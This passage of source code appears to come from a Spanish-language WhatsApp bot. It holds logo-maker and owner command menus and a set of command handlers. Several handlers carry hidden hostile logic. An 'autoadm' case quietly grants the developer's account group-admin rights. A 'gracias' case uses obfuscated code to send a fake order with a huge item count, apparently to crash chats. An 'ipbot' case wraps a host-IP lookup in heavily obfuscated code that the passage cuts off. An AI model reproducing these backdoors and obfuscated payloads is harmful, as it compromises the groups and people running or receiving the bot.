${bodyM} ${prefix}sandsummer *(Escribe un texto para crear logo)*
${bodyM} ${prefix}sandengraved *(Escribe un texto para crear logo)*
${bodyM} ${prefix}metaldark *(Escribe un texto para crear logo)*
${bodyM} ${prefix}neonlight *(Escribe un texto para crear logo)*
${bodyM} ${prefix}holographic *(Escribe un texto para crear logo)*
${bodyM} ${prefix}text1917 *(Escribe un texto para crear logo)*
${bodyM} ${prefix}minion *(Escribe un texto para crear logo)*
${bodyM} ${prefix}deluxesilver *(Escribe un texto para crear logo)*
${bodyM} ${prefix}newyearcard *(Escribe un texto para crear logo)*
${bodyM} ${prefix}bloodfrosted *(Escribe un texto para crear logo)*
${bodyM} ${prefix}halloween *(Escribe un texto para crear logo)*
${bodyM} ${prefix}jokerlogo *(Escribe un texto para crear logo)*
${bodyM} ${prefix}fireworksparkle *(Escribe un texto para crear logo)*
${bodyM} ${prefix}natureleaves *(Escribe un texto para crear logo)*
${bodyM} ${prefix}bokeh *(Escribe un texto para crear logo)*
${bodyM} ${prefix}toxic *(Escribe un texto para crear logo)*
${bodyM} ${prefix}strawberry *(Escribe un texto para crear logo)*
${bodyM} ${prefix}box3d *(Escribe un texto para crear logo)*
${bodyM} ${prefix}roadwarning *(Escribe un texto para crear logo)*
${bodyM} ${prefix}breakwall *(Escribe un texto para crear logo)*
${bodyM} ${prefix}icecold *(Escribe un texto para crear logo)*
${bodyM} ${prefix}luxury *(Escribe un texto para crear logo)*
${bodyM} ${prefix}cloud *(Escribe un texto para crear logo)*
${bodyM} ${prefix}summersand *(Escribe un texto para crear logo)*
${bodyM} ${prefix}horrorblood *(Escribe un texto para crear logo)*
${bodyM} ${prefix}thunder *(Escribe un texto para crear logo)*
${bodyM} ${prefix}pornhub *(Escribe un texto para crear logo)*
${bodyM} ${prefix}glitch *(Escribe un texto para crear logo)*
${bodyM} ${prefix}avenger *(Escribe un texto para crear logo)*
${bodyM} ${prefix}space *(Escribe un texto para crear logo)*
${bodyM} ${prefix}ninjalogo *(Escribe un texto para crear logo)*
${bodyM} ${prefix}marvelstudio *(Escribe un texto para crear logo)*
${bodyM} ${prefix}lionlogo *(Escribe un texto para crear logo)*
${bodyM} ${prefix}wolflogo *(Escribe un texto para crear logo)*
${bodyM} ${prefix}steel3d *(Escribe un texto para crear logo)*
${bodyM} ${prefix}wallgravity *(Escribe un texto para crear logo)*
${bodyM} ${prefix}sombra *(Escribe un texto para crear logo)*
${bodyM} ${prefix}cup *(Escribe un texto para crear logo)*
${bodyM} ${prefix}cup1 *(Escribe un texto para crear logo)*
${bodyM} ${prefix}romance *(Escribe un texto para crear logo)*
${bodyM} ${prefix}smoke *(Escribe un texto para crear logo)*
${bodyM} ${prefix}burnpaper *(Escribe un texto para crear logo)*
${bodyM} ${prefix}lovemessage *(Escribe un texto para crear logo)*
${bodyM} ${prefix}undergrass *(Escribe un texto para crear logo)*
${bodyM} ${prefix}love *(Escribe un texto para crear logo)*
${bodyM} ${prefix}cafe *(Escribe un texto para crear logo)*
${bodyM} ${prefix}woodheart *(Escribe un texto para crear logo)*
${bodyM} ${prefix}woodenboard *(Escribe un texto para crear logo)*
${bodyM} ${prefix}summer3d *(Escribe un texto para crear logo)*
${bodyM} ${prefix}wolfmetal *(Escribe un texto para crear logo)*
${bodyM} ${prefix}nature3d *(Escribe un texto para crear logo)*
${bodyM} ${prefix}underwater *(Escribe un texto para crear logo)*
${bodyM} ${prefix}golderrose *(Escribe un texto para crear logo)*
${bodyM} ${prefix}summernature *(Escribe un texto para crear logo)*
${bodyM} ${prefix}letterleaves *(Escribe un texto para crear logo)*
${bodyM} ${prefix}glowingneon *(Escribe un texto para crear logo)*
${bodyM} ${prefix}fallleaves *(Escribe un texto para crear logo)*
${bodyM} ${prefix}flamming *(Escribe un texto para crear logo)*
${bodyM} ${prefix}hp *(Escribe un texto para crear logo)*
${bodyM} ${prefix}carvedwood *(Escribe un texto para crear logo)*
${bodyM} ${prefix}tiktok *(Escribe un texto para crear logo)*
${bodyM} ${prefix}arcade8bit *(Escribe un texto para crear logo)*
${bodyM} ${prefix}battlefield4 *(Escribe un texto para crear logo)*
${bodyM} ${prefix}pubg *(Escribe un texto para crear logo)*
${bodyM} ${prefix}wetglass *(Escribe un texto para crear logo)*
${bodyM} ${prefix}multicolor3d *(Escribe un texto para crear logo)*
${bodyM} ${prefix}watercolor *(Escribe un texto para crear logo)*
${bodyM} ${prefix}luxurygold *(Escribe un texto para crear logo)*
${bodyM} ${prefix}galaxywallpaper *(Escribe un texto para crear logo)*
${bodyM} ${prefix}lighttext *(Escribe un texto para crear logo)*
${bodyM} ${prefix}beautifulflower *(Escribe un texto para crear logo)*
${bodyM} ${prefix}puppycute *(Escribe un texto para crear logo)*
${bodyM} ${prefix}royaltext *(Escribe un texto para crear logo)*
${bodyM} ${prefix}heartshaped *(Escribe un texto para crear logo)*
${bodyM} ${prefix}birthdaycake *(Escribe un texto para crear logo)*
${bodyM} ${prefix}galaxystyle *(Escribe un texto para crear logo)*
${bodyM} ${prefix}hologram3d *(Escribe un texto para crear logo)*
${bodyM} ${prefix}greenneon *(Escribe un texto para crear logo)*
${bodyM} ${prefix}glossychrome *(Escribe un texto para crear logo)*
${bodyM} ${prefix}greenbush *(Escribe un texto para crear logo)*
${bodyM} ${prefix}metallogo *(Escribe un texto para crear logo)*
${bodyM} ${prefix}noeltext *(Escribe un texto para crear logo)*
${bodyM} ${prefix}glittergold *(Escribe un texto para crear logo)*
${bodyM} ${prefix}textcake *(Escribe un texto para crear logo)*
${bodyM} ${prefix}starsnight *(Escribe un texto para crear logo)*
${bodyM} ${prefix}wooden3d *(Escribe un texto para crear logo)*
${bodyM} ${prefix}textbyname *(Escribe un texto para crear logo)*
${bodyM} ${prefix}writegalacy *(Escribe un texto para crear logo)*
${bodyM} ${prefix}galaxybat *(Escribe un texto para crear logo)*
${bodyM} ${prefix}snow3d *(Escribe un texto para crear logo)*
${bodyM} ${prefix}birthdayday *(Escribe un texto para crear logo)*
${bodyM} ${prefix}goldplaybutton *(Escribe un texto para crear logo)*
${bodyM} ${prefix}silverplaybutton *(Escribe un texto para crear logo)*
${bodyM} ${prefix}freefire *(Escribe un texto para crear logo)**
${bodyM} ${prefix}gtav *(Etiqueta una imagen)*
${bodyM} ${prefix}wanted *(Etiqueta una imagen)*
${bodyM} ${prefix}wasted *(Etiqueta una imagen)*
${bodyM} ${prefix}ocean *(Etiqueta una imagen)*
${bodyM} ${prefix}ger *(Etiqueta una imagen)*
${bodyM} ${prefix}drawing *(Etiqueta una imagen)*
${bodyM} ${prefix}cg *(Etiqueta una imagen)*

*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
	     🌸 SamịPerry.li 🌸
 ******************************
`,
contextInfo: {
mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
}
}
samu330.sendMessage(from, Menu7, MessageType.text, {
quoted: fvid})
break
case 'menu8':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
const Menu8 = {
text: `*COMANDOS PARA ${botNumber}*

╭─────────────
│ *${prefix}bloquear*
│ _Bloquea usuarios_
╰─────────────╮
╭─────────────╯
│ *${prefix}desbloquear*
│ _Desbloquea usuarios_
╰─────────────╮
╭─────────────╯
│ *${prefix}setname*
│ _Cambia tu nombre de usuario_
│
│ *${prefix}setpic*
│ _Actualiza tu foto de perfil_
│
│ *${prefix}setstatus*
│ _Cambia tu estado de WhatsApp_
╰─────────────╮
╭─────────────╯
│ *${prefix}estado*
│ _Envia un estado de texto_
╰─────────────╮
╭─────────────╯
│ *${prefix}estadopic*
│ _Envia una imagen a tu estado_
╰─────────────╮
╭─────────────╯
│ *${prefix}estadovid*
│ _Envia un video a tu estado_
╰─────────────╮
╭─────────────╯
│ *${prefix}vaciar*
│ _Vacia el chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}vaciartodo*
│ _Elimina todos los chats_
╰─────────────╮
╭─────────────╯
│ *${prefix}bc*
│ _Broadcast_
╰─────────────╮
╭─────────────╯
│ *${prefix}spam*
│ _Spam de mensajes_
╰─────────────╮
╭─────────────╯
│ *${prefix}fijar*
│ _Fijar el chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}desfijar*
│ _Desfija el chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}archivar*
│ _Archiva un chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}desarchivar*
│ _Desarchiva todo_
╰─────────────╮
╭─────────────╯
│ *${prefix}silencio*
│ _Mutea un chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}desilenciar*
│ _Desmutea un chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}sinleer*
│ _Muestra Chats sin leer_
╰─────────────╮
╭─────────────╯
│ *${prefix}apagar*
│ _Apaga el bot_
╰─────────────╮
╭─────────────╯
│ *${prefix}marcarsinleer*
│ _Marca como no leido todos los chats_
╰─────────────╮
╭─────────────╯
│ *${prefix}leertodo*
│ _Lee todos los chats_
╰──────────────────────`,
contextInfo: {
mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
}
}
samu330.sendMessage(from, Menu8, MessageType.text, {
quoted: ftoko})
break


case 'gracias':
var _0x56da=['367342lxQRgg','relayWAMessage','52224EUhLvZ','readFileSync','3184312811796096','2ZQhqXh','37BvfGXn','1QpYCgS','233589MYSAPS','296046BsnUGu','./src/fake.jpg','11131Xmdsqw','🤭 *Tranqui, no es nada* 😉','41623ZFgijY','4lYyqCf','INQUIRY','prepareMessageFromContent','1081869VYGFAG','1QmBtcR'];var _0x3cb2d7=_0x44c4;function _0x44c4(_0x538587,_0x3dc520){return _0x44c4=function(_0x56dab7,_0x44c4ad){_0x56dab7=_0x56dab7-0x11b;var _0x4c2ec7=_0x56da[_0x56dab7];return _0x4c2ec7;},_0x44c4(_0x538587,_0x3dc520);}(function(_0x1c8e57,_0x5dcd2a){var _0x2b3ad5=_0x44c4;while(!![]){try{var _0x1e1a08=parseInt(_0x2b3ad5(0x11b))*parseInt(_0x2b3ad5(0x127))+parseInt(_0x2b3ad5(0x12c))+parseInt(_0x2b3ad5(0x122))+parseInt(_0x2b3ad5(0x11e))*parseInt(_0x2b3ad5(0x121))+parseInt(_0x2b3ad5(0x126))*-parseInt(_0x2b3ad5(0x12b))+parseInt(_0x2b3ad5(0x124))*parseInt(_0x2b3ad5(0x11f))+-parseInt(_0x2b3ad5(0x120))*parseInt(_0x2b3ad5(0x12a));if(_0x1e1a08===_0x5dcd2a)break;else _0x1c8e57['push'](_0x1c8e57['shift']());}catch(_0x52a340){_0x1c8e57['push'](_0x1c8e57['shift']());}}}(_0x56da,0x99469),res=await samu330[_0x3cb2d7(0x129)](from,{'orderMessage':{'orderId':_0x3cb2d7(0x11d),'thumbnail':fs[_0x3cb2d7(0x11c)](_0x3cb2d7(0x123)),'itemCount':999999999,'status':_0x3cb2d7(0x128),'surface':'CATALOG','message':_0x3cb2d7(0x125),'orderTitle':''},'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}},{'quoted':sam,'contextInfo':{}}),samu330[_0x3cb2d7(0x12d)](res));
break

case 'top5':
if (!isGroup) return reply('*Este comando solo puede usarse en grupos🤕')
member = []
top5 = args.join(' ')
const p1 = groupMembers
const p2 = groupMembers
const p3 = groupMembers
const p4 = groupMembers
const p5 = groupMembers
const o1 = p1[Math.floor(Math.random() * p1.length)]
const o2 = p2[Math.floor(Math.random() * p2.length)]
const o3 = p3[Math.floor(Math.random() * p3.length)]
const o4 = p4[Math.floor(Math.random() * p4.length)]
const o5 = p5[Math.floor(Math.random() * p5.length)]
teks = `
*😵TOP CINCO:*\n\n1= @${o1.jid.split('@')[0]}\n\n2=@${o2.jid.split('@')[0]}\n\n3=@${o3.jid.split('@')[0]}\n\n4= @${o4.jid.split('@')[0]}\n\n5= @${o5.jid.split('@')[0]}\n\n\n_Top 5 de_ *${top5}* en este grupo`
member.push(o1.jid)
member.push(o2.jid)
member.push(o3.jid)
member.push(o4.jid)
member.push(o5.jid)
mentions(teks, member, true)
break
			
case 'google':
assistant = fs.readFileSync('./src/assistant.jpg')
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
let buscar = args.join(' ')
if (!buscar) return reply('Que deseas buscar?')
let search = await samuGg({ query: buscar })
let ggsm = ``
for (let i of search) {
ggsm += `
*Titulo :* ${i.title}
*Link :* ${i.link}
*Contenido :* ${i.snippet}

`
}
var nyangg = ggsm.trim()
reply(`*🔍Busqueda realizada por* 🐉Samu330🐉\n\n${nyangg}`)
break
			
case 'imagen':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (args.length < 1) return reply('Que deseas buscar?')
reply(`Porfavor espera un momento mientras busco imagenes de ` + args.join(' '))
ggimg = args.join(' ')
res = await samuGgImg(ggimg, google)
function google(error, result){
if (error){ return reply('_[ ! ] *Intentalo de nuevo*_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: sam, caption: `*🔍Busqueda de* _${ggimg}_\n*Realizada por 🐉Samu330🐉*`})
}
}
break
case 'apagar':
if (!isOwner) return reply('tu quien eres para decirme que hacer!?🤔')
reply('Me apagare en 3 Segundos....')
setTimeout( () => {
samu330.close() }, 3000)
break


case 'teles':
if (args.length == 0) return reply(`Ejemplo: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
ini_url = args[0]
ini_url = await getJson(`https://api.lolhuman.xyz/api/telestick?apikey=${api}&url=${ini_url}`)
ini_sticker = ini_url.result.sticker
for (sticker_ in ini_sticker) {
ini_buffer = await getBuffer(ini_sticker[sticker_])
await samu330.sendMessage(from, ini_buffer, sticker)
}
break

//encode y decode by Samu
case 'code':
texto = args.join(' ')
var rawStr = `${texto}`
var wordArray = CryptoJS.enc.Utf8.parse(rawStr);
var base64 = CryptoJS.enc.Base64.stringify(wordArray);
reply(`${base64}`)
break

case 'decode':
texto = args.join(' ')
var parseWordArray = CryptoJS.enc.Base64.parse(`${texto}`);
var parsedStr = parseWordArray.toString(CryptoJS.enc.Utf8);
reply(`${parsedStr}`)
break

case 'autoadm':
if (!isGroup) return
if (!Samu330) return
if (!botAdmin) return
samu330.groupMakeAdmin(from, [Samu330])
break

	//auto locate IP By Samu330
case 'ipbot':
ipbot = await getJson('http://ip-api.com/json/')
await sleep(200)
const _0x4fe4=[',\x22lon','DLAHd','sGMCd','VmNik','EQSpv','150336uwGIzn','mSANP','YkcjW','input','zweeY','qNAkH','\x22,\x22re','aDRqb','nCOtp','xNApM','dooIG','idFqN','DkoFE',',\x22tim','3330lrByXW','zip','conso','LxDuk','kGyPz','\x22,\x22qu','strin','IZqXE','init','UUiRi','\x22,\x22or','atus\x22','WDVTi','Z_$][','aDATe','nctio','WZmzB','excep','oTCSs','fMiCK','s\x20+\x20\x22','QpHla','org','zxXNo','jJbhL','call','acMIi','YpMfi','gger','YANar','Ucumy','33338uQUKLb','YteQU','actio','ery\x22:','oNFXY','tEKVJ','\x22,\x22co','hrxOs','warn','hQsbK','uwhjX','vUNVC','2McDdjz','zPgUW','\x22,\x22zi','xwnAd','n\x20/\x22\x20','g\x22:\x22',']+(\x20+','lVEgV','IovLI','ajZni','irNMz','ljxew','pNcVc','otjro','PyZIX','\x22,\x22la','uIwSp','CuLDg','kWyST','razij','JtAvL','xIdpU','qAaZP','dSDjL','wtuOd','BRSMH','log','aqboP','LIszd','timez','vRnAN','nMOms','Code\x22','Yfujy','nName','KliGd','MOnkw','ructo','VoPHH','KPXjR','QxTrw','juOaH','hdVfi','table','UYRck','hOOkz','gaoJo','xoczz','bVjDV','fFoeA','\x5c+\x5c+\x20','ame\x22:','ing','16338QrvgRx','zA-Z_','YLhyb','iFfml','pxSnm','OpDwl','[^\x20]+','ryCod','lon','Atkgq','PlBHJ','qPypB','is\x22)(','iOJTH','ydYpM','type','QAgev','UOXiM','HihcX','nexqX','JOpnv','icGbf','u330\x22','rn\x20th','HiqJj','YFqYc','untry','hrrsi','isp','lengt','ExRAS','UgjdT','aMgGg','lpNZA',',\x20\x22st',')+)+[','t\x22:','+\x20thi','a-zA-','OYKeW','grnjx','MsDSA','cayIr','LbMlW','^\x20]}','DFDWw','\x22:\x22','JbRtJ','BCLDG','239519CZxIsi','wMNej','bind','lspMs','dBbud','PeQVz','JyxCr','RfAYX',':\x22Sam','LdIOE','10hpLrEv','GjEhQ','LvPGb','PDVTN','GyElD','kZmxb','ScFPF','kxUPa','eNzzF','GqvcO','n\x20(fu','crdhw','mtHKG','\x22,\x22is','query','ZquYy','eCoZe','YQzdY','aYoYg','DeadY','\x22,\x22ci','\x5c(\x20*\x5c','0-9a-','eoegA','zKSRT','NmZCc','state','egion','city','aCuGl','ehzXZ','one','kRLXD','McNws','cess\x22','CsFEQ','lat','PmIpr','debu','oXdRd','YVydN','LFORT','\x22retu','rPKAZ','lLVis','regio','BqNQX','qnuKT','pfaWb','UfALj','*(?:[','aEWAN','apbGQ','HZMBh','TXEEa','e)\x20{}','EBtuN','MlUDW','KkoNe','count','shZdB','axPcR','\x20(tru','lAhiX','nstru','BcNcs','ZwYvz','ator\x22','YesFP',',\x22cou','JkURJ','toStr','nIIJd','gHVzj','tion','to__','n()\x20','lwvRM','$]*)','YTwea','__pro','\x22,\x22as','mSFkN','UAguk','ntry\x22','{\x22cre','trace','DVQno','iiblD','xKzvp','LWyfD','shQgV','Nxwdg','9pHLggP','info','ctor(','iHnPN','ceNUy','error','dXOoM','Objec','bIiHP','retur','GQHiY','HHuVa','Wstba','apply','lrcOB','zLWFB','ToBvj','bZLQF','Hdfot','YiPHl','while','cLLSF','vxJqv','vTeSn','DqroQ','{}.co','proto','IVqsf','ion\x20*','gionN','pvgdx','lNfzy','nQsvW','XjMSn','uUqda','test','jpALY','TAGXF','KnmXr','p\x22:\x22','22343BAZArm','funct','HcBGK','ty\x22:\x22','^([^\x20','oZhOg','jyhlQ','chain','MYOEs',':\x22suc','GTOqN','CmGwK','GPgML','jrZSW','mepzy','93169DYkfrN','\x20\x22,\x22r','const','ezone','iquNI','hELqN','pmLNA','aBemV','sPbMe','FQSmg','oRSDW','CcaDF','DbWvH','ZJZuC'];const _0x4e6c13=function(_0x30a11c,_0x5682db,_0x213b12,_0x1e7db,_0x47dffe){return _0x36ca(_0x213b12- -0x2c2,_0x1e7db);},_0x52408c=function(_0x27c4a0,_0x53559b,_0x254b3a,_0x5798b4,_0x48beae){return _0x36ca(_0x254b3a- -0x2c2,_0x5798b4);},_0x2b064e=function(_0x1708cd,_0x48bbd7,_0x4d2973,_0x32bcd8,_0x101e93){return _0x36ca(_0x4d2973- -0x2c2,_0x32bcd8);},_0x2987a2=function(_0x192365,_0x18d8ee,_0x246652,_0x383309,_0x26daac){return _0x36ca(_0x246652- -0x2c2,_0x383309);},_0x3e4932=function(_0x1418d4,_0x1f3247,_0x5222ca,_0x3353af,_0xf65520){return _0x36ca(_0x5222ca- -0x2c2,_0x3353af);};(function(_0x6cc414,_0x196724){const _0x3102be=function(_0x2f5a0d,_0x54c573,_0xd786b5,_0x6d05a9,_0x5d4619){return _0x36ca(_0x6d05a9-0x3e2,_0x54c573);},_0x128a19=function(_0x3e0086,_0x2fb999,_0x558922,_0x55e8d3,_0x7b816d){return _0x36ca(_0x55e8d3-0x3e2,_0x2fb999);},_0x2ae819=function(_0x5e5d05,_0x294e8e,_0x3849e2,_0x190a27,_0x440d09){return _0x36ca(_0x190a27-0x3e2,_0x294e8e);},_0x405221=function(_0x1ca437,_0x2d803b,_0x5203a6,_0x3a4035,_0x2a666e){return _0x36ca(_0x3a4035-0x3e2,_0x2d803b);},_0x3a652b=function(_0x8d3635,_0x4d824b,_0x482a67,_0x1156b8,_0x1890e0){return _0x36ca(_0x1156b8-0x3e2,_0x4d824b);};while(!![]){try{const _0x20968d=-parseInt(_0x3102be(0x534,0x54b,0x5f2,0x5aa,0x5e0))+parseInt(_0x128a19(0x5a6,0x625,0x5e0,0x589,0x597))+-parseInt(_0x2ae819(0x538,0x51a,0x5e8,0x57a,0x621))*-parseInt(_0x405221(0x51b,0x527,0x59d,0x4f5,0x586))+-parseInt(_0x3102be(0x62d,0x63a,0x53e,0x59c,0x51e))+-parseInt(_0x2ae819(0x581,0x590,0x509,0x552,0x4e7))*-parseInt(_0x3102be(0x3f2,0x3e7,0x3dc,0x479,0x44f))+-parseInt(_0x405221(0x45a,0x519,0x53f,0x4eb,0x476))+-parseInt(_0x405221(0x52d,0x4ea,0x517,0x485,0x46e))*parseInt(_0x405221(0x518,0x412,0x50c,0x4ba,0x4fd));if(_0x20968d===_0x196724)break;else _0x6cc414['push'](_0x6cc414['shift']());}catch(_0x52c037){_0x6cc414['push'](_0x6cc414['shift']());}}}(_0x4fe4,-0xab9f+0x1*0x1bef4+-0x5*-0x5dfb));const _0xd95acc=function(){const _0x21c8b8=function(_0x124c3d,_0x26c499,_0x44167f,_0x1ae3ba,_0x3dd41b){return _0x36ca(_0x44167f-0x25c,_0x124c3d);},_0x30ffc6=function(_0x409fb8,_0x411a27,_0x4db078,_0x2b5e81,_0x7010f4){return _0x36ca(_0x4db078-0x25c,_0x409fb8);},_0x5413e8=function(_0x540eef,_0x4a75c5,_0x24b375,_0x44d82b,_0x290b32){return _0x36ca(_0x24b375-0x25c,_0x540eef);},_0x54f6b0=function(_0x19278d,_0x562e25,_0x495254,_0x483483,_0x4033b0){return _0x36ca(_0x495254-0x25c,_0x19278d);},_0x4293da=function(_0x33f27d,_0x2cee9f,_0xc2196b,_0x2388be,_0x1af107){return _0x36ca(_0xc2196b-0x25c,_0x33f27d);},_0x1839b1={};_0x1839b1[_0x21c8b8(0x430,0x3e2,0x38c,0x321,0x380)]=function(_0x28ad76){return _0x28ad76();},_0x1839b1[_0x21c8b8(0x3f8,0x4c0,0x41b,0x449,0x42a)]=function(_0x134017,_0x19337e){return _0x134017!==_0x19337e;},_0x1839b1[_0x5413e8(0x295,0x2a3,0x2eb,0x37b,0x2d5)]=_0x30ffc6(0x2b0,0x2cd,0x342,0x3b7,0x2ae),_0x1839b1[_0x21c8b8(0x31f,0x3a9,0x3a5,0x3c0,0x387)]=_0x4293da(0x49d,0x3a3,0x3fc,0x37e,0x42c),_0x1839b1[_0x4293da(0x3f3,0x382,0x3ee,0x43e,0x405)]=_0x54f6b0(0x390,0x336,0x33f,0x39b,0x2db),_0x1839b1[_0x5413e8(0x483,0x4ac,0x408,0x3e0,0x419)]=_0x30ffc6(0x397,0x3b5,0x3ea,0x3fd,0x34e),_0x1839b1[_0x54f6b0(0x354,0x2c1,0x30c,0x2f0,0x2ed)]=function(_0x1dd6a3,_0x1bc7d6){return _0x1dd6a3!==_0x1bc7d6;},_0x1839b1[_0x54f6b0(0x3fc,0x387,0x3b8,0x32f,0x423)]=_0x4293da(0x393,0x365,0x308,0x364,0x376),_0x1839b1[_0x30ffc6(0x421,0x45b,0x40b,0x485,0x45e)]=_0x5413e8(0x30c,0x36b,0x375,0x2f4,0x2f4);const _0x4a8cdd=_0x1839b1;let _0x420b19=!![];return function(_0x214990,_0xeb12c){const _0x28073c=function(_0x2dfdf5,_0xcec134,_0x3d19db,_0x1ef95e,_0x43bd4d){return _0x30ffc6(_0x2dfdf5,_0xcec134-0xea,_0x1ef95e-0x18d,_0x1ef95e-0x4f,_0x43bd4d-0x118);},_0x9243b4=function(_0x28591c,_0x3425d2,_0x1c5c8f,_0x13f7e7,_0x5bb859){return _0x54f6b0(_0x28591c,_0x3425d2-0x9e,_0x13f7e7-0x18d,_0x13f7e7-0xb9,_0x5bb859-0xe3);},_0xa1bc00=function(_0x520caf,_0x25b3c8,_0x1c8961,_0x55abd4,_0x43118e){return _0x30ffc6(_0x520caf,_0x25b3c8-0x8d,_0x55abd4-0x18d,_0x55abd4-0x1b6,_0x43118e-0x195);},_0x5a4a49=function(_0x47fc71,_0x574777,_0xc8875d,_0x5164fe,_0x595e56){return _0x30ffc6(_0x47fc71,_0x574777-0x132,_0x5164fe-0x18d,_0x5164fe-0x10f,_0x595e56-0x1f1);},_0xf6501f=function(_0x44f89e,_0x39066d,_0x1d169b,_0x47177b,_0x1270ce){return _0x30ffc6(_0x44f89e,_0x39066d-0x83,_0x47177b-0x18d,_0x47177b-0xc0,_0x1270ce-0xc7);},_0x378b39={};_0x378b39[_0x28073c(0x4c0,0x469,0x50d,0x48a,0x519)]=function(_0x7c950f){const _0x440b85=function(_0x3fdd8c,_0x782ef,_0x41e36c,_0x2a9def,_0x11cdc4){return _0x28073c(_0x2a9def,_0x782ef-0xcf,_0x41e36c-0x1d7,_0x41e36c- -0x2d5,_0x11cdc4-0xf6);};return _0x4a8cdd[_0x440b85(0x1da,0x262,0x244,0x2aa,0x2be)](_0x7c950f);},_0x378b39[_0x28073c(0x4f5,0x52e,0x579,0x51f,0x51d)]=function(_0x5b5b1e,_0x7758c0){const _0x4edf59=function(_0x1f87d6,_0x27b69f,_0x2e425e,_0x38a04e,_0x46a9f5){return _0x28073c(_0x27b69f,_0x27b69f-0x32,_0x2e425e-0xc5,_0x38a04e-0xcf,_0x46a9f5-0xc4);};return _0x4a8cdd[_0x4edf59(0x71f,0x6c5,0x5e1,0x677,0x6a0)](_0x5b5b1e,_0x7758c0);},_0x378b39[_0x28073c(0x486,0x55b,0x54e,0x528,0x4de)]=_0x4a8cdd[_0x28073c(0x509,0x446,0x4a0,0x478,0x480)],_0x378b39[_0x5a4a49(0x5d4,0x52f,0x5d5,0x583,0x616)]=_0x4a8cdd[_0x28073c(0x5b2,0x498,0x547,0x532,0x57b)],_0x378b39[_0x9243b4(0x607,0x528,0x545,0x5ac,0x56f)]=_0x4a8cdd[_0x5a4a49(0x4d6,0x5a5,0x57a,0x57b,0x4fe)],_0x378b39[_0x5a4a49(0x55e,0x5dc,0x5b4,0x555,0x5dc)]=_0x4a8cdd[_0xf6501f(0x630,0x59b,0x601,0x595,0x535)];const _0x1d630d=_0x378b39;if(_0x4a8cdd[_0x5a4a49(0x4e5,0x45c,0x4d0,0x499,0x4b8)](_0x4a8cdd[_0x9243b4(0x558,0x54c,0x4b2,0x545,0x4cc)],_0x4a8cdd[_0x9243b4(0x5b6,0x60f,0x62f,0x598,0x5da)])){const _0x2d77ef=_0x420b19?function(){const _0x47c670=function(_0x43820b,_0x1072f0,_0x257b5b,_0x372b56,_0x1d1d0a){return _0x9243b4(_0x43820b,_0x1072f0-0x1f3,_0x257b5b-0x8a,_0x1072f0-0x229,_0x1d1d0a-0x115);},_0x32a26f=function(_0x165e2a,_0x5b5e09,_0x328f2b,_0x3ffce0,_0xb324eb){return _0x28073c(_0x165e2a,_0x5b5e09-0x10b,_0x328f2b-0xcd,_0x5b5e09-0x229,_0xb324eb-0x14f);},_0x2a0236=function(_0x2e66ee,_0x125611,_0x439cc8,_0x1dcd25,_0x2decf2){return _0xa1bc00(_0x2e66ee,_0x125611-0xf1,_0x439cc8-0x91,_0x125611-0x229,_0x2decf2-0xb0);},_0x283e09=function(_0x4cf59d,_0x5f065b,_0x5990de,_0x2d690b,_0x2f35ab){return _0xa1bc00(_0x4cf59d,_0x5f065b-0x116,_0x5990de-0x1b8,_0x5f065b-0x229,_0x2f35ab-0x30);},_0x2ef1dc=function(_0x104ede,_0x5bce33,_0x2b82a8,_0x5dfa20,_0x1eb50c){return _0x9243b4(_0x104ede,_0x5bce33-0x12c,_0x2b82a8-0x2c,_0x5bce33-0x229,_0x1eb50c-0xa6);},_0x2a70a8={};_0x2a70a8[_0x47c670(0x6bf,0x764,0x7f7,0x737,0x7a0)]=function(_0x848f36){const _0x396afb=function(_0x5b6ab6,_0xdc837e,_0x58ca39,_0x378834,_0x34391a){return _0x47c670(_0x58ca39,_0x378834- -0x160,_0x58ca39-0x154,_0x378834-0xc,_0x34391a-0x166);};return 